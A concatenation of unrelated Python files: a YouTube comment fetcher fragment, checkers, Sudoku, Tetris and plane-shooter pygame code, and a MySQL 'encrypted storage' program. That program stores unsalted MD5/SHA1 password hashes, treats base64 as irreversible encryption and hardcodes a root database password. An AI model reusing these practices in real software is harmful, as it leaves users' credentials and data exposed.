            'maxResults': 2,
            'order': 'relevance',  # default is 'time' (newest)
        }
    else:
        # should be a channel
        channel_id = get_channel_id_by_url(url)
        params = {
            'allThreadsRelatedToChannelId': channel_id,
            'maxResults': 2,
            'order': 'relevance',  # default is 'time' (newest)
        }
    # get the first 2 pages (2 API requests)
    n_pages = 2
    for i in range(n_pages):
        # make API call to get all comments from the channel (including posts & videos)
        response = get_comments(youtube, **params)
        items = response.get("items")
        # if items is empty, breakout of the loop
        if not items:
            break
        for item in items:
            comment = item["snippet"]["topLevelComment"]["snippet"]["textDisplay"]
            updated_at = item["snippet"]["topLevelComment"]["snippet"]["updatedAt"]
            like_count = item["snippet"]["topLevelComment"]["snippet"]["likeCount"]
            comment_id = item["snippet"]["topLevelComment"]["id"]
            print(f"""\
            Comment: {comment}
            Likes: {like_count}
            Updated At: {updated_at}
            ==================================\
            """)
        if "nextPageToken" in response:
            # if there is a next page
            # add next page token to the params we pass to the function
            params["pageToken"] = response["nextPageToken"]
        else:
            # must be end of comments!!!!
            break
        print("*" * 70)


import pygame
from Piece import Piece

class Pawn(Piece):
	def __init__(self, x, y, color, board):
		super().__init__(x, y, color, board)
		img_path = f'images/{color}-pawn.png'
		self.img = pygame.image.load(img_path)
		self.img = pygame.transform.scale(self.img, (board.tile_width, board.tile_height))
		self.notation = 'p'

	def _possible_moves(self):
		# (x, y) move for left and right
		if self.color == "red":
			possible_moves = ((-1, -1), (+1, -1))
		else:
			possible_moves = ((-1, +1), (+1, +1))
		return possible_moves

	def valid_moves(self):
		tile_moves = []
		moves = self._possible_moves()
		for move in moves:
			tile_pos = (self.x + move[0], self.y + move[-1])
			if tile_pos[0] < 0 or tile_pos[0] > 7 or tile_pos[-1] < 0 or tile_pos[-1] > 7:
				pass
			else:
				tile = self.board.get_tile_from_pos(tile_pos)
				if tile.occupying_piece == None:
					tile_moves.append(tile)
		return tile_moves

	def valid_jumps(self):
		tile_jumps = []
		moves = self._possible_moves()
		for move in moves:
			tile_pos = (self.x + move[0], self.y + move[-1])
			if tile_pos[0] < 0 or tile_pos[0] > 7 or tile_pos[-1] < 0 or tile_pos[-1] > 7:
				pass
			else:
				tile = self.board.get_tile_from_pos(tile_pos)
				if self.board.turn == self.color:
					if tile.occupying_piece != None and tile.occupying_piece.color != self.color:
						next_pos = (tile_pos[0] + move[0], tile_pos[-1] + move[-1])
						next_tile = self.board.get_tile_from_pos(next_pos)
						if next_pos[0] < 0 or next_pos[0] > 7 or next_pos[-1] < 0 or next_pos[-1] > 7:
							pass
						else:
							if next_tile.occupying_piece == None:
								tile_jumps.append((next_tile, tile))
		return tile_jumps


import pygame
import math
from cell import Cell
from sudoku import Sudoku
from clock import Clock

from settings import WIDTH, HEIGHT, N_CELLS, CELL_SIZE

pygame.font.init()


class Table:
    def __init__(self, screen):
        self.screen = screen

        self.puzzle = Sudoku(N_CELLS, (N_CELLS * N_CELLS) // 2)
        self.clock = Clock()

        self.answers = self.puzzle.puzzle_answers()
        self.answerable_table = self.puzzle.puzzle_table()
        self.SRN = self.puzzle.SRN

        self.table_cells = []
        self.num_choices = []
        self.clicked_cell = None
        self.clicked_num_below = None
        self.cell_to_empty = None
        self.making_move = False
        self.guess_mode = True

        self.lives = 3
        self.game_over = False

        self.delete_button = pygame.Rect(0, (HEIGHT + CELL_SIZE[1]), (CELL_SIZE[0] * 3), (CELL_SIZE[1]))
        self.guess_button = pygame.Rect((CELL_SIZE[0] * 6), (HEIGHT + CELL_SIZE[1]), (CELL_SIZE[0] * 3), (CELL_SIZE[1]))
        self.font = pygame.font.SysFont('Bauhaus 93', (CELL_SIZE[0] // 2))
        self.font_color = pygame.Color("white")

        self._generate_game()
        self.clock.start_timer()

    def _generate_game(self):
        # generating sudoku table
        for y in range(N_CELLS):
            for x in range(N_CELLS):
                cell_value = self.answerable_table[y][x]
                is_correct_guess = True if cell_value != 0 else False
                self.table_cells.append(Cell(x, y, CELL_SIZE, cell_value, is_correct_guess))

        # generating number choices
        for x in range(N_CELLS):
            self.num_choices.append(Cell(x, N_CELLS, CELL_SIZE, x + 1))

    def _draw_grid(self):
        grid_color = (50, 80, 80)
        pygame.draw.rect(self.screen, grid_color, (-3, -3, WIDTH + 6, HEIGHT + 6), 6)

        i = 1
        while (i * CELL_SIZE[0]) < WIDTH:
            line_size = 2 if i % 3 > 0 else 4
            pygame.draw.line(self.screen, grid_color, ((i * CELL_SIZE[0]) - (line_size // 2), 0),
                             ((i * CELL_SIZE[0]) - (line_size // 2), HEIGHT), line_size)
            pygame.draw.line(self.screen, grid_color, (0, (i * CELL_SIZE[0]) - (line_size // 2)),
                             (HEIGHT, (i * CELL_SIZE[0]) - (line_size // 2)), line_size)
            i += 1

    def _draw_buttons(self):
        # adding delete button details
        dl_button_color = pygame.Color("red")
        pygame.draw.rect(self.screen, dl_button_color, self.delete_button)
        del_msg = self.font.render("Delete", True, self.font_color)
        self.screen.blit(del_msg,
                         (self.delete_button.x + (CELL_SIZE[0] // 2), self.delete_button.y + (CELL_SIZE[1] // 4)))
        # adding guess button details
        gss_button_color = pygame.Color("blue") if self.guess_mode else pygame.Color("purple")
        pygame.draw.rect(self.screen, gss_button_color, self.guess_button)
        gss_msg = self.font.render("Guess: On" if self.guess_mode else "Guess: Off", True, self.font_color)
        self.screen.blit(gss_msg,
                         (self.guess_button.x + (CELL_SIZE[0] // 3), self.guess_button.y + (CELL_SIZE[1] // 4)))

    def _get_cell_from_pos(self, pos):
        for cell in self.table_cells:
            if (cell.row, cell.col) == (pos[0], pos[1]):
                return cell

    # checking rows, cols, and subgroups for adding guesses on each cell
    def _not_in_row(self, row, num):
        for cell in self.table_cells:
            if cell.row == row:
                if cell.value == num:
                    return False
        return True

    def _not_in_col(self, col, num):
        for cell in self.table_cells:
            if cell.col == col:
                if cell.value == num:
                    return False
        return True

    def _not_in_subgroup(self, rowstart, colstart, num):
        for x in range(self.SRN):
            for y in range(self.SRN):
                current_cell = self._get_cell_from_pos((rowstart + x, colstart + y))
                if current_cell.value == num:
                    return False
        return True

    # remove numbers in guess if number already guessed in the same row, col, subgroup correctly
    def _remove_guessed_num(self, row, col, rowstart, colstart, num):
        for cell in self.table_cells:
            if cell.row == row and cell.guesses != None:
                for x_idx, guess_row_val in enumerate(cell.guesses):
                    if guess_row_val == num:
                        cell.guesses[x_idx] = 0
            if cell.col == col and cell.guesses != None:
                for y_idx, guess_col_val in enumerate(cell.guesses):
                    if guess_col_val == num:
                        cell.guesses[y_idx] = 0

        for x in range(self.SRN):
            for y in range(self.SRN):
                current_cell = self._get_cell_from_pos((rowstart + x, colstart + y))
                if current_cell.guesses != None:
                    for idx, guess_val in enumerate(current_cell.guesses):
                        if guess_val == num:
                            current_cell.guesses[idx] = 0

    def handle_mouse_click(self, pos):
        x, y = pos[0], pos[1]

        # getting table cell clicked
        if x <= WIDTH and y <= HEIGHT:
            x = x // CELL_SIZE[0]
            y = y // CELL_SIZE[1]
            clicked_cell = self._get_cell_from_pos((x, y))

            # if clicked empty cell
            if clicked_cell.value == 0:
                self.clicked_cell = clicked_cell
                self.making_move = True

            # clicked unempty cell but with wrong number guess
            elif clicked_cell.value != 0 and clicked_cell.value != self.answers[y][x]:
                self.cell_to_empty = clicked_cell

        # getting number selected
        elif x <= WIDTH and y >= HEIGHT and y <= (HEIGHT + CELL_SIZE[1]):
            x = x // CELL_SIZE[0]
            self.clicked_num_below = self.num_choices[x].value

        # deleting numbers
        elif x <= (CELL_SIZE[0] * 3) and y >= (HEIGHT + CELL_SIZE[1]) and y <= (HEIGHT + CELL_SIZE[1] * 2):
            if self.cell_to_empty:
                self.cell_to_empty.value = 0
                self.cell_to_empty = None

        # selecting modes
        elif x >= (CELL_SIZE[0] * 6) and y >= (HEIGHT + CELL_SIZE[1]) and y <= (HEIGHT + CELL_SIZE[1] * 2):
            self.guess_mode = True if not self.guess_mode else False

        # if making a move
        if self.clicked_num_below and self.clicked_cell != None and self.clicked_cell.value == 0:
            current_row = self.clicked_cell.row
            current_col = self.clicked_cell.col
            rowstart = self.clicked_cell.row - self.clicked_cell.row % self.SRN
            colstart = self.clicked_cell.col - self.clicked_cell.col % self.SRN

            if self.guess_mode:
                # checking the vertical group, the horizontal group, and the subgroup
                if self._not_in_row(current_row, self.clicked_num_below) and self._not_in_col(current_col,
                                                                                              self.clicked_num_below):
                    if self._not_in_subgroup(rowstart, colstart, self.clicked_num_below):
                        if self.clicked_cell.guesses != None:
                            self.clicked_cell.guesses[self.clicked_num_below - 1] = self.clicked_num_below
            else:
                self.clicked_cell.value = self.clicked_num_below
                # if the player guess correctly
                if self.clicked_num_below == self.answers[self.clicked_cell.col][self.clicked_cell.row]:
                    self.clicked_cell.is_correct_guess = True
                    self.clicked_cell.guesses = None
                    self._remove_guessed_num(current_row, current_col, rowstart, colstart, self.clicked_num_below)
                # if guess is wrong
                else:
                    self.clicked_cell.is_correct_guess = False
                    self.clicked_cell.guesses = [0 for x in range(9)]
                    self.lives -= 1
            self.clicked_num_below = None
            self.making_move = False
        else:
            self.clicked_num_below = None

    def _puzzle_solved(self):
        check = None
        for cell in self.table_cells:
            if cell.value == self.answers[cell.col][cell.row]:
                check = True
            else:
                check = False
                break
        return check

    def update(self):
        [cell.update(self.screen, self.SRN) for cell in self.table_cells]

        [num.update(self.screen) for num in self.num_choices]

        self._draw_grid()
        self._draw_buttons()

        if self._puzzle_solved() or self.lives == 0:
            self.clock.stop_timer()
            self.game_over = True
        else:
            self.clock.update_timer()

        self.screen.blit(self.clock.display_timer(), (WIDTH // self.SRN, HEIGHT + CELL_SIZE[1]))


import sys
import pygame
import random

pygame.init()

# Screen dimensions
WIDTH, HEIGHT = 800, 600
GRID_SIZE = 25

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)
BLUE = (0, 0, 255)
GREEN = (0, 255, 0)
COLORS = [RED, BLUE, GREEN]

# Tetromino shapes
SHAPES = [
    [
        ['.....',
         '.....',
         '.....',
         'OOOO.',
         '.....'],
        ['.....',
         '..O..',
         '..O..',
         '..O..',
         '..O..']
    ],
    [
        ['.....',
         '.....',
         '..O..',
         '.OOO.',
         '.....'],
        ['.....',
         '..O..',
         '.OO..',
         '..O..',
         '.....'],
        ['.....',
         '.....',
         '.OOO.',
         '..O..',
         '.....'],
        ['.....',
         '..O..',
         '..OO.',
         '..O..',
         '.....']
    ],
    [
        [
            '.....',
            '.....',
            '..OO.',
            '.OO..',
            '.....'],
        ['.....',
         '.....',
         '.OO..',
         '..OO.',
         '.....'],
        ['.....',
         '.O...',
         '.OO..',
         '..O..',
         '.....'],
        ['.....',
         '..O..',
         '.OO..',
         '.O...',
         '.....']
    ],
    [
        ['.....',
         '..O..',
         '..O.',
         '..OO.',
         '.....'],
        ['.....',
         '...O.',
         '.OOO.',
         '.....',
         '.....'],
        ['.....',
         '.OO..',
         '..O..',
         '..O..',
         '.....'],
        ['.....',
         '.....',
         '.OOO.',
         '.O...',
         '.....']
    ],
]


class Tetromino:
    def __init__(self, x, y, shape):
        self.x = x
        self.y = y
        self.shape = shape
        self.color = random.choice(COLORS)  # You can choose different colors for each shape
        self.rotation = 0


class Tetris:
    def __init__(self, width, height):
        self.width = width
        self.height = height
        self.grid = [[0 for _ in range(width)] for _ in range(height)]
        self.current_piece = self.new_piece()
        self.game_over = False
        self.score = 0  # Add score attribute

    def new_piece(self):
        # Choose a random shape
        shape = random.choice(SHAPES)
        # Return a new Tetromino object
        return Tetromino(self.width // 2, 0, shape)

    def valid_move(self, piece, x, y, rotation):
        """Check if the piece can move to the given position"""
        for i, row in enumerate(piece.shape[(piece.rotation + rotation) % len(piece.shape)]):
            for j, cell in enumerate(row):
                try:
                    if cell == 'O' and (self.grid[piece.y + i + y][piece.x + j + x] != 0):
                        return False
                except IndexError:
                    return False
        return True

    def clear_lines(self):
        """Clear the lines that are full and return the number of cleared lines"""
        lines_cleared = 0
        for i, row in enumerate(self.grid[:-1]):
            if all(cell != 0 for cell in row):
                lines_cleared += 1
                del self.grid[i]
                self.grid.insert(0, [0 for _ in range(self.width)])
        return lines_cleared

    def lock_piece(self, piece):
        """Lock the piece in place and create a new piece"""
        for i, row in enumerate(piece.shape[piece.rotation % len(piece.shape)]):
            for j, cell in enumerate(row):
                if cell == 'O':
                    self.grid[piece.y + i][piece.x + j] = piece.color
        # Clear the lines and update the score
        lines_cleared = self.clear_lines()
        self.score += lines_cleared * 100  # Update the score based on the number of cleared lines
        # Create a new piece
        self.current_piece = self.new_piece()
        # Check if the game is over
        if not self.valid_move(self.current_piece, 0, 0, 0):
            self.game_over = True
        return lines_cleared

    def update(self):
        """Move the tetromino down one cell"""
        if not self.game_over:
            if self.valid_move(self.current_piece, 0, 1, 0):
                self.current_piece.y += 1
            else:
                self.lock_piece(self.current_piece)

    def draw(self, screen):
        """Draw the grid and the current piece"""
        for y, row in enumerate(self.grid):
            for x, cell in enumerate(row):
                if cell:
                    pygame.draw.rect(screen, cell, (x * GRID_SIZE, y * GRID_SIZE, GRID_SIZE - 1, GRID_SIZE - 1))

        if self.current_piece:
            for i, row in enumerate(
                    self.current_piece.shape[self.current_piece.rotation % len(self.current_piece.shape)]):
                for j, cell in enumerate(row):
                    if cell == 'O':
                        pygame.draw.rect(screen, self.current_piece.color, (
                        (self.current_piece.x + j) * GRID_SIZE, (self.current_piece.y + i) * GRID_SIZE, GRID_SIZE - 1,
                        GRID_SIZE - 1))


def draw_score(screen, score, x, y):
    """Draw the score on the screen"""
    font = pygame.font.Font(None, 36)
    text = font.render(f"Score: {score}", True, WHITE)
    screen.blit(text, (x, y))


def draw_game_over(screen, x, y):
    """Draw the game over text on the screen"""
    font = pygame.font.Font(None, 48)
    text = font.render("Game Over", True, RED)
    screen.blit(text, (x, y))


def main():
    # Initialize pygame
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption('Tetris')
    # Create a clock object
    clock = pygame.time.Clock()
    # Create a Tetris object
    game = Tetris(WIDTH // GRID_SIZE, HEIGHT // GRID_SIZE)
    fall_time = 0
    fall_speed = 50  # You can adjust this value to change the falling speed, it's in milliseconds
    while True:
        # Fill the screen with black
        screen.fill(BLACK)
        for event in pygame.event.get():
            # Check for the QUIT event
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            # Check for the KEYDOWN event
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT:
                    if game.valid_move(game.current_piece, -1, 0, 0):
                        game.current_piece.x -= 1  # Move the piece to the left
                if event.key == pygame.K_RIGHT:
                    if game.valid_move(game.current_piece, 1, 0, 0):
                        game.current_piece.x += 1  # Move the piece to the right
                if event.key == pygame.K_DOWN:
                    if game.valid_move(game.current_piece, 0, 1, 0):
                        game.current_piece.y += 1  # Move the piece down
                if event.key == pygame.K_UP:
                    if game.valid_move(game.current_piece, 0, 0, 1):
                        game.current_piece.rotation += 1  # Rotate the piece
                if event.key == pygame.K_SPACE:
                    while game.valid_move(game.current_piece, 0, 1, 0):
                        game.current_piece.y += 1  # Move the piece down until it hits the bottom
                    game.lock_piece(game.current_piece)  # Lock the piece in place
        # Get the number of milliseconds since the last frame
        delta_time = clock.get_rawtime()
        # Add the delta time to the fall time
        fall_time += delta_time
        if fall_time >= fall_speed:
            # Move the piece down
            game.update()
            # Reset the fall time
            fall_time = 0
        # Draw the score on the screen
        draw_score(screen, game.score, 10, 10)
        # Draw the grid and the current piece
        game.draw(screen)
        if game.game_over:
            # Draw the "Game Over" message
            draw_game_over(screen, WIDTH // 2 - 100, HEIGHT // 2 - 30)  # Draw the "Game Over" message
            # You can add a "Press any key to restart" message here
            # Check for the KEYDOWN event
            if event.type == pygame.KEYDOWN:
                # Create a new Tetris object
                game = Tetris(WIDTH // GRID_SIZE, HEIGHT // GRID_SIZE)
        # Update the display
        pygame.display.flip()
        # Set the framerate
        clock.tick(60)


# -*- coding: utf-8 -*-
# Author:哈士奇说喵
# 用户加密存储系统
import base64
import pymysql
import hashlib


# 初始化数据库子函数
def Init():
    # 创建数据库
    try:
        cur.execute('create database MD5_Storetest')  # 创建名为professors数据库
        cur.execute('use MD5_Storetest')  # 切到该数据库
        cur.execute(
            'create TABLE store(id BIGINT(7) NOT NULL AUTO_INCREMENT,user_name VARCHAR(100),passwd VARCHAR(100),encrypt_words VARCHAR(10000),encrypt_password VARCHAR(100),created TIMESTAMP DEFAULT CURRENT_TIMESTAMP ,PRIMARY KEY(id))')
        print('-------------------------------Create Database Succeed-------------------------------')
    except:
        # print 'database existed'
        cur.execute('use MD5_Storetest')  # 切到该数据库


# MD5和SHA1加密算法
def md5(str1):
    md = hashlib.md5()
    md.update(str1)
    md_5 = md.hexdigest()
    return md_5,


def sha1(str1):
    sh = hashlib.sha1()
    sh.update(str1)
    sha_1 = sh.hexdigest()
    return sha_1


# 自定义加密、解密算法子函数。结合base64
def encrypt(key, content):  # key:密钥,content:明文
    s1 = base64.encodestring(str(content))  # 将内容进行base64加密
    len1 = len(key) % 7  # 取余数
    len1_list = list_key[len1]  # 取余数对应list_key中伪码
    mix_first = str(key) + s1  # 将key转化为字符串后拼接第一次加密的内容
    mix = len1_list + base64.encodestring(mix_first)  # 对拼接后字符串再进行加密，再加个伪码

    return mix  # 存入数据库中，不能被反解


def decrypt(key, mix):  # key:密钥,content:密文

    len2 = len(key) % 7
    len2_findlist = list_key[len2]

    if len2_findlist == mix[0]:  # 先确定伪码
        s2_first = base64.decodestring(mix[1:])  # 反解出第一次的base64编码
        s2_second = s2_first[0:len(key)]  # 获取第一次解出前缀是否为key

        if s2_second == str(key):  # key值对应了
            s2_end = base64.decodestring(s2_first[len(key):])  # 反解出去掉前缀后的真实内容的64位编码
            print('-------------------------------Validation Succeed!-------------------------------')

            return s2_end
        else:
            print("Warning!Validation Failed！Can't Get Secret Words!")

    else:
        print("Warning!Validation Failed！Can't Get Secret Words!")


# 密码加密与明文加密存储子函数
def PasswdSecretWD_encrypt(name, keywords, cho, key_content, content_key):
    # 根据选项进行下一步操作
    if cho == '1':

        mix = encrypt(key_content, content_key)
        print(
            "############################################\n#MD5-Password&Plaintext Encryption Succeed!#\n############################################")

        try:
            key_content_sha1 = sha1(key_content)  # 对KEY进行加密
            store(name, md5(keywords), mix, key_content_sha1)
        except:
            print("Warning!Can't Find SQL!")

    elif cho == '2':

        mix = encrypt(key_content, content_key)

        try:
            key_content_md5 = md5(key_content)[0]  # 对KEY进行加密
            store(name, sha1(keywords), mix, key_content_md5)
        except:
            print('Warning!Insert SQL Failed!')
    else:
        print("Warning!Something Wrong in Your Encryption Algorithm!")


# 数据库的存储子函数
def store(user_name, passwd, encrypt_str, key_content):
    cur.execute("insert into store(user_name,passwd,encrypt_words,encrypt_password) VALUES (%s,%s,%s,%s)",
                (user_name, passwd, encrypt_str, key_content))

    cur.connection.commit()  # commit()提交事物，做出改变后必须提交事务，不然不能更新


# 数据库的提取子函数
def check(user_name):
    cur.execute('select * FROM store WHERE user_name=%s', (user_name))
    return cur.fetchall()  # 抓取符合的一整行，元组形式返回


# 加密内容解密子函数
def getSecret(key, sql_str):  # 获取数据库中加密数据后解密

    try:
        ans = decrypt(key, sql_str)
        return ans
    except:
        print("Warning!Decryption Failed!Can't Get Secret Words!")


# 更新密码子函数
def updatePasswd(existed_name):
    try:
        # 判断是否为该用户，要求输入原始密码，经过校验后，才允许修改
        ori_passwd = raw_input("Please Enter Original Password:")
        if str(check(existed_name)[0][2]) == md5(ori_passwd)[0] or str(check(existed_name)[0][2]) == sha1(ori_passwd):
            new_passwd = raw_input("Please Enter New Password:")
            new_passwdmd5 = md5(new_passwd)  # 新密码一律采用md5加密，实在懒得再写加密子函数了
            try:
                cur.execute('update store SET passwd =%s WHERE user_name=%s', (new_passwdmd5[0], existed_name))
                cur.connection.commit()  # commit()提交事物！！！！
                print("##########################\n#Update Password Succeed!#\n##########################")
            except:
                print("Warning!Update Password Failed!")
        else:
            print("Warning!Wrong Password!")
    except:
        print("Warning!Update Password Failed!")


# 更新KEY子函数
def updateKEY(existed_name):
    try:
        ori_KEY = raw_input("Please Enter Original KEY:")
        if str(check(existed_name)[0][4]) == md5(ori_KEY)[0] or str(check(existed_name)[0][4]) == sha1(ori_KEY):
            new_KEY = raw_input("Please Enter New KEY:")
            new_KEYmd5 = md5(new_KEY)
            # 因为自己设计的加密解密函数和key绑定，随key变换而变化，所以需要更新下Plaintext
            secwd = getSecret(ori_KEY, str(check(existed_name)[0][3]))
            mix_update = encrypt(new_KEY, secwd)
            try:
                cur.execute('update store SET encrypt_words =%s WHERE user_name=%s', (mix_update, existed_name))
                # 因为自己设计的加密算法有key的加入，所以更换key后，加密内容也会改变，所以执行更新加密内容
                cur.execute('update store SET encrypt_password =%s WHERE user_name=%s', (new_KEYmd5[0], existed_name))
                cur.connection.commit()  # commit()提交事物！！！！
                print("#####################\n#Update KEY Succeed!#\n#####################")
            except:
                print("Warning!Update KEY Failed!")
        else:
            print("Warning!Wrong KEY!")
    except:
        print("Warning!Update KEY Failed!")


# 删除用户子函数
def DeleteUser(name_req):
    try:
        cur.execute('delete FROM store WHERE user_name=%s', (name_req))
        cur.connection.commit()  # commit()提交事物！！！！
        print("######################\n#Delete User Succeed!#\n######################")
    except:
        print("Warning!Delete User Failed!")


# 用户登录&更新子函数
def LogIn(name_req, keywords_req):
    if str(check(name_req)[0][2]) == md5(keywords_req)[0] or str(check(name_req)[0][2]) == sha1(keywords_req):
        print("-------------------------------Welcome %s-------------------------------" % name_req)

        while 1:
            print("-------------------------------%s:What's Next?-------------------------------" % name_req)
            check_update = raw_input(
                "Update Plaintext-1    View Plaintext-2    Update Password-3    Update KEY-4    Log out-5    Delete User-6\nYour Choice: ")
            if check_update == '1':
                key_encrypt = raw_input("KEY:")
                if sha1(key_encrypt) == str(check(name_req)[0][4]) or md5(key_encrypt)[0] == str(check(name_req)[0][4]):
                    # 显示一下以前存储的内容，看看需不需要更新
                    print("Original Plaintext:%s" % (getSecret(key_encrypt, str(check(name_req)[0][3]))))
                    new_plaintext = raw_input("New Plaintext:")
                    new_mix = encrypt(key_encrypt, new_plaintext)
                    try:
                        cur.execute('update store set encrypt_words=%s WHERE user_name=%s', (new_mix, name_req))
                        cur.connection.commit()  # commit()提交事物！！！！
                        print("###########################\n#Update Plaintext Succeed!#\n###########################")
                    except:
                        print("Warning!Update Plaintext Failed!")

                else:
                    print("Warning!Wrong KEY!")

            elif check_update == '2':
                key_encrypt = raw_input("KEY:")
                if str(check(name_req)[0][4]) == md5(key_encrypt)[0] or str(check(name_req)[0][4]) == sha1(key_encrypt):
                    try:
                        secwd = getSecret(key_encrypt, str(check(name_req)[0][3]))
                        print("Secret Words:%s" % (secwd))
                    except:
                        print("Warning!Get Secret Words Failed!")
                else:
                    print("Warning!Wrong KEY!")

            elif check_update == '3':
                updatePasswd(name_req)

            elif check_update == '4':
                updateKEY(name_req)

            elif check_update == '5':
                break
            elif check_update == '6':
                DeleteUser(name_req)
                break

            else:
                print("Warning!Something Wrong in Your Choice!")



    else:
        print("Warning!Can't Find The User or Wrong Password!")


def Store_Encrypt():
    print('-------------------------------Store&Encrypt-------------------------------')
    name = raw_input('New User:')
    try:
        while name == check(name)[0][1].encode('utf-8'):
            print("Warning!The Name Already Exist!")
            print("-------------------------------Make Your Choice-------------------------------------")
            update = raw_input("Change Password-1    Create New User-2\nSelect Mode:")
            if update == '1':
                updatePasswd(name)
                break
            if update == '2':
                name = raw_input('New User:')


    except:
        keywords = raw_input('Set Password:')
        print("-------------------------------Password Encrypt Algorithm-------------------------------------")
        cho = raw_input('MD5-1   SHA1-2\nSelect Algorithm:')

        print("-------------------------------What's Next?-------------------------------------")
        kc = raw_input("Store Encrypt Plaintext-1    Maybe Next Time-2\nYour Choice:")

        if kc == '1':
            key_content = raw_input('Please Design Your KEY:')
            content_key = raw_input('Plaintext:')

        else:
            key_content = '123456'
            content_key = 'Default Storage'
            print("Default KEY '123456'\nDefault Plaintext 'Default Storage'")

        PasswdSecretWD_encrypt(name, keywords, cho, key_content, content_key)


# 主函数
def Main():
    while 1:
        Init()
        print("-------------------------------Mode Choice-------------------------------------")
        ty = raw_input(
            'Store&Encrypt-1     Login&View&Update&Delete-2    Quit System-3    Clear Database-4\nSelect Mode:')

        if ty == '1':
            Store_Encrypt()

        if ty == '2':
            print('-------------------------------Login&View&Update&Delete-------------------------------')
            name_req = raw_input('User:')
            keywords_req = raw_input('Password:')
            try:
                LogIn(name_req, keywords_req)
            except:
                print("Warning!Can't Find The User or Wrong Password!")

        if ty == '3':
            print('-------------------------------Quit The System-------------------------------')
            break

        if ty == '4':
            print("-------------------------------Warning!ALL Data Will Be Wiped!-------------------------------")

            sure = raw_input('Confirm-Y    Quit-N\nYour Choice:')
            if sure.upper() == 'Y':
                try:
                    cur.execute('drop database MD5_Storetest')
                    print('-------------------------------Wipe Database Succeed-------------------------------')
                    print("-------------------------------What's Next?-------------------------------")
                    new_database = raw_input('Create New Database-Y    Quit-N\nYour Choice:')
                    if new_database.upper() == 'Y':
                        Init()
                    else:
                        break
                except:
                    print('Warning!Wipe Database Failed!')
            else:
                print('-------------------------------Operation Aborted-------------------------------')


# 程序入口
if __name__ == '__main__':

    try:
        conn = pymysql.connect(host='127.0.0.1', user='root', passwd='A089363b', db='mysql', charset='utf8')
        # 与数据库建立连接
        cur = conn.cursor()
        # 实例化光标
        print("-------------------------------SQL Connection Succeed-------------------------------")

    except:
        print("Warning!SQL Connection Failed!")

    # 创建属于自己的伪码表，用于自己的加密算法服务
    list_key = ['G', 'h', 'S', '2', 'M', 'a', 'm']
    Main()

    try:
        cur.close()
        conn.close()
        print("-------------------------------SQL Connection Closed-------------------------------")
        print("-------------------------------Over-------------------------------")
    except:
        print("Warning!Can't Close Connection!")

import sys
import pygame

pygame.init()
from plane_sprites import *


# **************************************************************
# FileName: plane_main.py***************************************
# Author:  Junieson *********************************************
# Version:  2019.8.12 ******************************************
# ****************************************************************
class PlaneGame(object):
    """飞机大战主游戏"""

    def __init__(self):
        print("游戏初始化")

        # 1. 创建游戏的窗口
        self.screen = pygame.display.set_mode(SCREEN_RECT.size)
        # 创建结束界面
        self.canvas_over = CanvasOver(self.screen)
        # 2. 创建游戏的时钟
        self.clock = pygame.time.Clock()
        # 3. 调用私有方法，精灵和精灵组的创建
        self.__create_sprites()
        # 分数对象
        self.score = GameScore()
        # 程序控制指针
        self.index = 0
        # 音乐bgm
        self.bg_music = pygame.mixer.Sound("./music/game_music.ogg")
        self.bg_music.set_volume(0.3)
        self.bg_music.play(-1)
        # 游戏结束了吗
        self.game_over = False
        # 4. 设置定时器事件 - 创建敌机　1s
        pygame.time.set_timer(CREATE_ENEMY_EVENT, random.randint(1000, 2000))
        pygame.time.set_timer(HERO_FIRE_EVENT, 400)
        pygame.time.set_timer(BUFF1_SHOW_UP, random.randint(10000, 20000))
        pygame.time.set_timer(BUFF2_SHOW_UP, random.randint(20000, 40000))
        pygame.time.set_timer(ENEMY_FIRE_EVENT, 2000)

    def __create_sprites(self):

        # 创建背景精灵和精灵组
        bg1 = Background()
        bg2 = Background(True)

        self.back_group = pygame.sprite.Group(bg1, bg2)

        # 创建敌机的精灵组

        self.enemy_group = pygame.sprite.Group()

        # 创建英雄的精灵和精灵组
        self.hero = Hero()
        self.hero_group = pygame.sprite.Group(self.hero)

        # 创建敌军子弹组
        self.enemy_bullet_group = pygame.sprite.Group()

        # 血条列表
        self.bars = []
        self.bars.append(self.hero.bar)

        # 创建buff组
        self.buff1_group = pygame.sprite.Group()

        # 创建假象boom组
        self.enemy_boom = pygame.sprite.Group()

        # bomb列表
        self.bombs = []

    def start_game(self):
        print("游戏开始...")

        while True:
            # 1. 设置刷新帧率
            self.clock.tick(FRAME_PER_SEC)
            # 2. 事件监听
            self.__event_handler()
            # 3. 碰撞检测
            self.__check_collide()
            # 4. 更新/绘制精灵组
            self.__update_sprites()

            # 是否要结束游戏

            if self.game_over:
                self.canvas_over.update()

            # 5. 更新显示
            pygame.display.update()

    def __event_handler(self):  # 事件检测

        if self.score.getvalue() > 200 + 500 * self.index:
            self.boss = Boss()
            self.enemy_group.add(self.boss)
            self.bars.append(self.boss.bar)
            self.index += 1

        for event in pygame.event.get():
            # 判断是否退出游戏
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == CREATE_ENEMY_EVENT:
                # 创建敌机精灵将敌机精灵添加到敌机精灵组
                if self.score.getvalue() < 20:
                    enemy = Enemy()
                else:
                    if random.randint(0, 100) % 4:
                        enemy = Enemy()
                    else:
                        enemy = Enemy(2)

                self.enemy_group.add(enemy)
                self.bars.append(enemy.bar)

            elif event.type == HERO_FIRE_EVENT:
                for hero in self.hero_group:
                    hero.fire()
            elif event.type == BUFF1_SHOW_UP:
                buff1 = Buff1()
                self.buff1_group.add(buff1)
            elif event.type == BUFF2_SHOW_UP:
                if self.hero.bar.color == color_red:  # 按需分配
                    buff = Buff3()
                else:
                    buff = Buff2()
                self.buff1_group.add(buff)
            elif event.type == ENEMY_FIRE_EVENT:
                for enemy in self.enemy_group:
                    if enemy.number >= 2:
                        enemy.fire()
                        for bullet in enemy.bullets:
                            self.enemy_bullet_group.add(bullet)
            elif event.type == pygame.KEYDOWN and event.key == pygame.K_SPACE:
                self.bomb_throw()
            else:
                if self.game_over == True:
                    flag = self.canvas_over.event_handler(event)
                    if flag == 1:
                        self.__start__()
                    elif flag == 0:
                        pygame.quit()
                        sys.exit()

        # 使用键盘提供的方法获取键盘按键 - 按键元组
        keys_pressed = pygame.key.get_pressed()
        # 判断元组中对应的按键索引值 1
        if keys_pressed[pygame.K_RIGHT]:
            self.heros_move(5)
        elif keys_pressed[pygame.K_LEFT]:
            self.heros_move(-5)
